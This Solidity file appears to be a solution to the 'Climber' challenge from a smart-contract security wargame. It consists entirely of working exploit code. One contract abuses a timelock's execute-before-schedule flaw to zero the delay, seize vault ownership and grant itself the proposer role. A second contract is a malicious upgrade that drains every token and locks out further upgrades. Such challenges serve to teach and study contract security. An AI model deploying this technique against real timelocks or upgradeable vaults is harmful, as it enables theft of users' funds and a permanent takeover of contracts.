// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";


contract ClimberVaultAttack {
    address payable immutable climberTimeLock;

    // parameters for ClimberTimelock.execute() & ClimberTimelock.schedule()
    address[] targets      = new address[](4);
    uint256[] values       = [0,0,0,0];
    bytes[]   dataElements = new bytes[](4);
    bytes32   salt         = bytes32("!.^.0.0.^.!");

    constructor(address payable _climberTimeLock, address _climberVault) {
        climberTimeLock = _climberTimeLock;

        // address upon which function + parameter payloads will be called by ClimberTimelock.execute()
        targets[0]      = climberTimeLock;
        targets[1]      = _climberVault; 
        targets[2]      = climberTimeLock;
        targets[3]      = address(this);

        // first payload call ClimberTimelock.delay()
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        // second payload call ClimberVault.transferOwnership()
        dataElements[1] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, msg.sender);
        // third payload call to ClimberTimelock.grantRole()
        dataElements[2] = abi.encodeWithSelector(AccessControl.grantRole.selector,
                                                 PROPOSER_ROLE, address(this));
        // fourth payload call ClimberVaultAttack.corruptSchedule()
        // I tried to have it directly call ClimberTimelock.schedule() but this was
        // resulting in a different ClimberTimelockBase.getOperationId() as the last
        // element of dataElements was visible inside ClimberTimelock.execute() but not
        // within ClimberTimelock.schedule(). Calling instead to a function back in
        // the attack contract and having that call ClimberTimelock.schedule() gets
        // around this
        dataElements[3] = abi.encodeWithSelector(ClimberVaultAttack.corruptSchedule.selector);
    }

    function corruptSchedule() external {
        ClimberTimelock(climberTimeLock).schedule(targets, values, dataElements, salt);
    }

    function attack() external {
        ClimberTimelock(climberTimeLock).execute(targets, values, dataElements, salt);
    }
}

// once attacker has ownership of ClimberVault, they will upgrade it to
// this version which modifies sweepFunds() to allow owner to drain tokens
contract ClimberVaultAttackUpgrade is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    // must preserve storage layout or upgrade will fail
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function initialize(address, address, address) external initializer {
        // Initialize inheritance chain
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    // changed to allow only owner to drain funds
    function sweepFunds(address token) external onlyOwner {
        SafeTransferLib.safeTransfer(token, msg.sender, IERC20(token).balanceOf(address(this)));
    }

    // prevent anyone but attacker from further upgrades
    function _authorizeUpgrade(address) internal override onlyOwner {}
}
